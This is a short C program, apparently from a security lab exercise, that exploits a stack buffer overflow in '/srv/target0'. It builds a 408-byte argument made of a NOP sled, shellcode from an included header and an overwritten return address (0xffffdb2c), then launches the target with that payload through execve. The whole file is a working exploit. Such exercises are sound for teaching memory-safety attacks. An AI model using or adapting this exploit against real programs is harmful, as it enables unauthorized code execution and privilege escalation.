#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int PAYLOAD_SIZE = 408;
const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
const uint32_t RETURN_ADDRESS = 0xffffdb2c;

void preparePayload(char *payload) {
    memset(payload, 0x90, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE] = '\0';
    memcpy(payload, shellcode, SHELLCODE_SIZE);
    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
}

int main(void)
{
    char *args[3];
    char *env[1];
    char payload[PAYLOAD_SIZE + 1];

    preparePayload(payload);

    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}